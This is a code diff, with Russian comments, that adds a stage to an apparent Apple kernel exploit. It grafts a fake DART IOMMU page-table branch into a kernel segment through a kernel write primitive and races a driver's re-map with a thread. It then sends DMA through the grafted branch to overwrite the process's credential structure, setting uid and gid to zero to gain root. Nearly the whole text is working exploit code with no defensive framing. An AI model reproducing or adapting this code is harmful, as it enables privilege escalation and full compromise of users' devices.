@@ -7764,6 +7764,131 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 }
             }
         }
+        // 1.9.213: P7 DART GRAFT — вместо поиска zone-VA чужого листа ПРИВИВАЕМ
+        // свою ветку: L0[0] нашего сегмента пуст, seg-структуры пишутся через
+        // zone-VA (P5 proof). Строим L1→L2→L3 в своих wired-страницах (PA через
+        // нашу pmap), L0[0]=ссылка на L1, L3[leaf]=целевой PTE (ctl2 для proof,
+        // потом ucredPA для форжа). DART ходит по нашей ветке — мимо physmap RO,
+        // rewriter'а и лотерей. Race-тред дожимает L0[0] против re-map драйвера.
+        if (!pteVA && ptePAFound) {
+            uint64_t dvaG = dva ? dva : 0x10122000000ULL;
+            uint64_t pageIdxG = dvaG >> 14;
+            uint32_t ig[4] = { (uint32_t)((pageIdxG & 0x3e00000000ULL) >> 33),
+                               (uint32_t)((pageIdxG & 0x1ffc00000ULL) >> 22),
+                               (uint32_t)((pageIdxG & 0x3ff800ULL) >> 11),
+                               (uint32_t)(pageIdxG & 0x7ff) };
+            uint8_t *L1p = valloc(0x4000), *L2p = valloc(0x4000), *L3p = valloc(0x4000);
+            uint8_t *ctl2 = valloc(0x4000);
+            memset(L1p, 0, 0x4000); memset(L2p, 0, 0x4000); memset(L3p, 0, 0x4000); memset(ctl2, 0xDD, 0x4000);
+            uint64_t L1PA = vtophys(ttM, (uint64_t)L1p), L2PA = vtophys(ttM, (uint64_t)L2p),
+                     L3PA = vtophys(ttM, (uint64_t)L3p), ctl2PA = vtophys(ttM, (uint64_t)ctl2);
+            // валидация PA как у ctlPA (маркер → phystokv)
+            *(volatile uint64_t *)L1p = 0xBADC0FFEE00D0001ULL;
+            uint64_t pv1 = L1PA ? phystokv(L1PA) : 0;
+            BOOL paOK = pv1 && early_kread64(pv1) == 0xBADC0FFEE00D0001ULL;
+            kpNote(r, [NSString stringWithFormat:@"  [P7] DVA=%#llx idx %u/%u/%u/%u L1PA=%#llx L2PA=%#llx L3PA=%#llx ctl2PA=%#llx — PA-валидация: %@",
+                      (unsigned long long)dvaG, ig[0], ig[1], ig[2], ig[3],
+                      (unsigned long long)L1PA, (unsigned long long)L2PA, (unsigned long long)L3PA, (unsigned long long)ctl2PA,
+                      paOK ? @"СОШЛАСЬ" : @"НЕ СОШЛАСЬ — стоп"]);
+            if (paOK && ig[0] == 0) {
+                *(volatile uint64_t *)L1p = 0;   // убрать маркер
+                // звенья: link = (childPA>>4)|1 (р.50); PTE флаги — из живого origPTE
+                uint64_t linkFlags = (origPTE & ~0x0000FFFFFFFFF000ULL);
+                *(uint64_t *)(L1p + (uint64_t)ig[1] * 8) = (L2PA >> 4) | 1;
+                *(uint64_t *)(L2p + (uint64_t)ig[2] * 8) = (L3PA >> 4) | 1;
+                *(uint64_t *)(L3p + (uint64_t)ig[3] * 8) = ctl2PA | linkFlags;
+                // seg-структура с пустым L0[0]
+                uint64_t segVA = 0;
+                for (uint32_t i = 0; i < 8 && !segVA; i++) {
+                    uint64_t s = kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8)) : 0;
+                    if (!kpLooksLikeKernelPointer(s) || !kpSafeToRead(s)) continue;
+                    if (early_kread64(s + (uint64_t)ig[0] * 8) == 0) segVA = s;
+                }
+                kpNote(r, [NSString stringWithFormat:@"  [P7] segVA=%#llx L0[%u] — прививка link=%#018llx",
+                          (unsigned long long)segVA, ig[0], (unsigned long long)((L1PA >> 4) | 1)]);
+                if (segVA) {
+                    uint64_t l0slot = segVA + (uint64_t)ig[0] * 8;
+                    early_kwrite64(l0slot, (L1PA >> 4) | 1);
+                    uint64_t rbL0 = early_kread64(l0slot);
+                    kpNote(r, [NSString stringWithFormat:@"  [P7] L0[%u] readback=%#018llx — %@", ig[0], (unsigned long long)rbL0,
+                              rbL0 == ((L1PA >> 4) | 1) ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    if (rbL0 == ((L1PA >> 4) | 1)) {
+                        // race-тред: дожимаем L0[0] всё окно execute (драйвер может переписать)
+                        __block volatile BOOL stopRace = NO;
+                        __block volatile uint64_t raceSlot = l0slot;
+                        __block volatile uint64_t raceVal = (L1PA >> 4) | 1;
+                        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+                            while (!stopRace) { early_kwrite64(raceSlot, raceVal); usleep(50); }
+                        });
+                        uint8_t tsdG[0x1B0];
+                        memcpy(tsdG, tsdV, sizeof(tsdG));
+                        *(uint32_t *)(tsdG + 0) = srcID;
+                        *(uint32_t *)(tsdG + 4) = dstID;
+                        *(uint64_t *)(tsdG + 8) = 1;
+                        kern_return_t gkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdG, sizeof(tsdG), NULL, NULL, NULL, NULL);
+                        kpNote(r, [NSString stringWithFormat:@"  [P7] graft-submit kr=0x%x — жду DMA по нашей ветке", gkr]);
+                        usleep(400000);
+                        stopRace = YES;
+                        int ch2 = 0;
+                        for (uint32_t i = 0; i < 0x4000; i += 4) {
+                            uint32_t px = *(volatile uint32_t *)(ctl2 + i);
+                            if (px != 0xDDDDDDDD && px != 0) { ch2++; if (ch2 <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl2+%#x: %#010x", i, px]); }
+                        }
+                        kpNote(r, [NSString stringWithFormat:@"  [P7] ctl2 changed=%d — %@", ch2,
+                                  ch2 ? @"★★★ GRAFT РАБОТАЕТ: DART прошёл по нашей ветке!" : @"ветка проигнорирована (TLB/инвалид)"]);
+                        // restore L0[0]=0 всегда
+                        early_kwrite64(l0slot, 0);
+                        if (ch2) {
+                            // ФОРЖ: L3[leaf] → ucredPA, src = payload
+                            uint64_t prF2 = 0, roF2 = 0, ucF2 = 0;
+                            if (selfProcM) {
+                                prF2 = early_kread64(selfProcM + koffsetof(proc, proc_ro));
+                                roF2 = prF2 ? kp_untag_ptr(prF2) : 0;
+                                ucF2 = roF2 ? kp_untag_ptr(early_kread64(roF2 + koffsetof(proc_ro, ucred))) : 0;
+                            }
+                            uint64_t upageVA = ucF2 & ~0x3fffULL;
+                            uint32_t uoff2 = (uint32_t)(ucF2 & 0x3fff);
+                            uint64_t upagePA = kpLooksLikeKernelPointer(ucF2) ? kvtophys(upageVA) : 0;
+                            uint64_t upkva = upagePA ? phystokv(upagePA) : 0;
+                            BOOL uOK = upkva && early_kread64(upkva) == early_kread64(upageVA) &&
+                                       (uint32_t)early_kread64(upkva + uoff2 + 0x18) == (uint32_t)getuid() && uoff2 + 0xc0 <= 0x1000;
+                            kpNote(r, [NSString stringWithFormat:@"  [P7-F] ucred=%#llx upagePA=%#llx — валидация: %@", (unsigned long long)ucF2, (unsigned long long)upagePA, uOK ? @"СОШЛАСЬ" : @"НЕ СОШЛАСЬ"]);
+                            if (uOK) {
+                                uint8_t fbuf2[0x1000];
+                                for (uint32_t i = 0; i < 0x1000; i += 8) *(uint64_t *)(fbuf2 + i) = early_kread64(upageVA + i);
+                                *(uint32_t *)(fbuf2 + uoff2 + 0x18) = 0;
+                                *(uint32_t *)(fbuf2 + uoff2 + 0x1c) = 0;
+                                *(uint32_t *)(fbuf2 + uoff2 + 0x20) = 0;
+                                *(uint32_t *)(fbuf2 + uoff2 + 0x28) = 0;
+                                *(uint32_t *)(fbuf2 + uoff2 + 0x68) = 0;
+                                *(uint32_t *)(fbuf2 + uoff2 + 0x6c) = 0;
+                                *(uint64_t *)(fbuf2 + uoff2 + 0x78) = 0;
+                                IOSurfaceLock(srcS, 0, NULL);
+                                uint8_t *sp3 = (uint8_t *)IOSurfaceGetBaseAddress(srcS);
+                                if (sp3) memcpy(sp3, fbuf2, 0x1000);
+                                IOSurfaceUnlock(srcS, 0, NULL);
+                                *(uint64_t *)(L3p + (uint64_t)ig[3] * 8) = upagePA | linkFlags;
+                                // L0[0] снова наш link + race
+                                stopRace = NO;
+                                dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+                                    while (!stopRace) { early_kwrite64(raceSlot, raceVal); usleep(50); }
+                                });
+                                kern_return_t fkr2 = IOConnectCallMethod(victim, 1, NULL, 0, tsdG, sizeof(tsdG), NULL, NULL, NULL, NULL);
+                                kpNote(r, [NSString stringWithFormat:@"  [P7-F] forge-submit kr=0x%x — DMA в ucred", fkr2]);
+                                usleep(400000);
+                                stopRace = YES;
+                                early_kwrite64(l0slot, 0);
+                                uid_t gu2 = getuid(); gid_t gg2 = getgid();
+                                uint32_t cru2 = (uint32_t)early_kread64(ucF2 + 0x18);
+                                kpNote(r, [NSString stringWithFormat:@"  [P7-F] getuid()=%u getgid()=%u cr_uid=%u", gu2, gg2, cru2]);
+                                if (gu2 == 0) kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — DART GRAFT форж ucred РАБОТАЕТ ===");
+                            }
+                        }
+                    }
+                }
+            }
+            free(L1p); free(L2p); free(L3p); free(ctl2);
+        }
         if (pteVA) {
             uint64_t newPTE = (origPTE & ~ptePAMask) | (ctlPA & ptePAMask);
             kpNote(r, [NSString stringWithFormat:@"  [P2] ПОДМЕНА PTE %#018llx → %#018llx", (unsigned long long)origPTE, (unsigned long long)newPTE]);
